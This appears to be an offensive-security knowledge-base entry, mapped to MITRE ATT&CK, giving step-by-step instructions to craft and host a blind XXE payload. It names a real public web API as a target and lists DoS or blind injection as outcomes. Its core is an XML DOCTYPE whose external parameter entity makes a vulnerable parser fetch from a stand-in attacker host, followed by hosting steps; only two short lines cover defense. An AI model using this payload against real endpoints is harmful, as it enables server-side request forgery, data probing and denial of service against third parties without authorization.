---
tags:
  - xxe
  - blind-xxe
  - web
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: b2348dd2-c264-4889-b6f5-db2ad012aef9
created_at: '2025-12-13T09:00:33.818Z'
updated_at: '2025-12-13T09:00:33.818Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Host Malicious XML for XXE

## Summary

This procedure involves creating and hosting a malicious XML file on an attacker-controlled server to exploit XXE vulnerabilities by including external entity references that force the target server to fetch attacker resources.

## Description

The procedure sets up a blind XXE payload in an XML file, which when parsed by a vulnerable endpoint, expands entities to request arbitrary resources. This is targeted at web APIs like DuckDuckGo's endpoint, leading to DoS or blind injection. Prerequisites include control over a public server.

## Requirements

1. Attacker-controlled public server
2. Ability to host static files
3. Network connectivity

## Defense

Defensive measures and detection strategies:

- Disable external entity resolution in XML parsers
- Monitor outbound requests from servers for anomalies

## Objectives

1. Host XML to trigger XXE
2. Enable entity expansion
3. Achieve blind injection

## Instructions

### Step 1: Create Malicious XML

**Context**: Craft the XML with an external entity reference.

Create a file named xxe.xml with:

```xml
<?xml version="1.0" ?><!DOCTYPE root [<!ENTITY % ext SYSTEM "http://attacker_host/Blind_xxe"> %ext;]><r></r>
```

> This defines an entity that points to an attacker resource.

### Step 2: Host the File

**Context**: Make the XML publicly accessible.

Upload the file to your server at http://attacker_host/xxe.xml.

> Ensure the server allows GET requests to this file.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used



## Tools Used



## Tags

- [[xxe]]
- [[blind-xxe]]
